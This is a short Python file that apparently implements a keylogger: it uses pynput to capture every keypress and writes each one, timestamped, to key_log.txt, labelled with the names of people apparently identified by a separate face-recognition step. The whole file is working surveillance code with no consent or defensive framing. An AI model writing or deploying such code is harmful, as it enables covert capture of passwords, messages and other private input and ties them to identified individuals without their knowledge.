from pynput.keyboard import Key, Listener
import logging

log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

faces = 'Unknown: '

def set_faces(f):

    global faces

    if len(f) > 0:
        faces = ''
        for i in range(len(f)):
            faces += str(f[i])
            if i < len(f) - 1:
                faces += ', '

    else: faces = 'Unknown: '

def on_press(key):
    logging.info(faces + ': ' + str(key))

def init():
    with Listener(on_press=on_press) as listener:
        listener.join()